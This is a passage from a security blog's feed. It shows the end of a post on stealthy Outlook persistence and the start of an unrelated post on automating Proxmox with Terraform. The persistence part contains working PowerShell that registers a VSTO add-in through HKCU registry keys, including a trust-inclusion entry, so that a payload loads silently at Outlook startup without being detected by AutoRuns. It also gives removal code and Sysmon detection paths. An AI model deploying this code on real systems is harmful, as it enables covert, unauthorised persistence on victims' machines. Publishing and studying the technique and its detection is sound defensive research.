    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RegistryKeys&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(Default)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Outlook Extension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FriendlyName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Outlook Extension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Manifest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file:///&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PayloadPath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(Default)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file:///&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PayloadPath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;(Default)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;addInName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;officeApplication&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;friendlyName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;loadBehavior&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;compatibleFrameworks&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;compatibleFrameworks xmlns=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urn:schemas-microsoft-com:clickonce.v2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`n`t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;framework targetVersion=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; profile=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Full&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; supportedRuntime=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4.0.30319&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;`n`t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/compatibleFrameworks&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PreferredClr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;v4.0.30319&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file:///&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PayloadPath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PublicKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;RSAKeyValue&amp;gt;&amp;lt;Modulus&amp;gt;yDCewQWG8XGHpxD57nrwp+EZInIMenUDOXwCFNAyKLzytOjC/H9GeYPnn0PoRSzwvQ5gAfb9goKlN3fUrncFJE8QAOuX+pqhnchgJDi4IkN7TDhatd/o8X8O5v0DBoqBVQF8Tz60DpcH55evKNRPylvD/8EG/YuWVylSwk8v5xU=&amp;lt;/Modulus&amp;gt;&amp;lt;Exponent&amp;gt;AQAB&amp;lt;/Exponent&amp;gt;&amp;lt;/RSAKeyValue&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$KeyPair&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RegistryKeys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-ItemProperty&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$KeyPair&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$KeyPair&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$KeyPair&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PropertyType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;String&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Out-Null&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
	&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Done.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-ItemProperty&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Loadbehavior&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x00000003&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DWord&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Out-Null&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;


&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Remove-OutlookAddin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;&amp;lt;#
    &lt;/span&gt;&lt;span class=&quot;cs&quot;&gt;.SYNOPSIS&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;

        Removes the Outlook add-in
        Author: @_vivami

    &lt;/span&gt;&lt;span class=&quot;cs&quot;&gt;.EXAMPLE&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;

        PS&amp;gt; Remove-OutlookAddin 
#&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RegistryPaths&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#@(&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RegistryPaths&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Recurse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sure enough, it worked! The add-in was installed and loaded by Outlook upon startup, without a pop-up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/calc-pop.gif&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Taking a look at Sysinternals’ AutoRuns, we can see that this VSTO add-in is not detected.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;msrc&quot;&gt;MSRC&lt;/h3&gt;
&lt;p&gt;I’ve reached out to Microsoft Security Response Center, but since this is not a breach of a &lt;a href=&quot;https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria&quot;&gt;security boundary&lt;/a&gt;, this bug does not meet the bar for servicing and will not be fixed.&lt;/p&gt;

&lt;h3 id=&quot;detection&quot;&gt;Detection&lt;/h3&gt;
&lt;p&gt;To detect this persistence technique, monitor “RegistryEvent Value Set”-events (Sysmon Event ID 13) on the following paths:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HKCU:\Software\Microsoft\Office\Outlook\Addins\
HKCU:\Software\Microsoft\Office\Word\Addins\
HKCU:\Software\Microsoft\Office\Excel\Addins\
HKCU:\Software\Microsoft\Office\Powerpoint\Addins\
HKCU:\Software\Microsoft\VSTO\Security\Inclusion\
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;You can try all of this yourself with the PoC code on my &lt;a href=&quot;https://github.com/vivami/OutlookParasite&quot;&gt;GitHub repo&lt;/a&gt;.&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Tradecraft" /><category term="Persistence" /><summary type="html">In 2019 I was researching new “stealthy” persistence techniques that were not yet published or commonly known. I was triggered by the techniques that (mis)used plugins for programs on the target’s machine. Particularly interesting targets are browsers, e-mail clients and messaging apps, as they’re typically started after boot.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/outlook-header.jpg" /><media:content medium="image" url="https://vanmieghem.io/assets/images/headers/outlook-header.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Automating Proxmox with Terraform and Ansible</title><link href="https://vanmieghem.io/automating-proxmox-with-terraform-ansible/" rel="alternate" type="text/html" title="Automating Proxmox with Terraform and Ansible" /><published>2020-12-30T00:00:00+01:00</published><updated>2020-12-30T00:00:00+01:00</updated><id>https://vanmieghem.io/automating-proxmox-with-terraform-ansible</id><content type="html" xml:base="https://vanmieghem.io/automating-proxmox-with-terraform-ansible/">&lt;p&gt;During the hoidays I played around a bit with automating parts of my Proxmox homeserver setup. It consists of various LXC containers (CT) and Virtual Machines (VMs) for dedicated tasks and while I don’t regularly setup new containers and VMs, it’d be nice to have an quick and automated way of doing so.&lt;/p&gt;

&lt;p&gt;For this automation I &lt;a href=&quot;https://github.com/vivami/proxmox-automation&quot;&gt;created&lt;/a&gt; a simple configuration that provisions a VM or CT using Terraform and Ansible. Telemate developed a &lt;a href=&quot;https://github.com/Telmate/terraform-provider-proxmox&quot;&gt;Terraform provider&lt;/a&gt; that maps Terraform functionality to the Proxmox API, so start by defining the use of that provider in &lt;code class=&quot;highlighter-rouge&quot;&gt;version.tf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;terraform {
  required_providers {
    proxmox = {
      source = &quot;Telmate/proxmox&quot;
      version = &quot;2.6.6&quot;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;main.tf&lt;/code&gt; I’ve defined the variables for the Telemate Proxmox provider, for which the values of these are assigned in &lt;code class=&quot;highlighter-rouge&quot;&gt;var.tf&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;provider &quot;proxmox&quot; {
    pm_api_url = var.proxmox_host[&quot;pm_api_url&quot;]
    pm_user = var.proxmox_host[&quot;pm_user&quot;]
    pm_tls_insecure = true
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
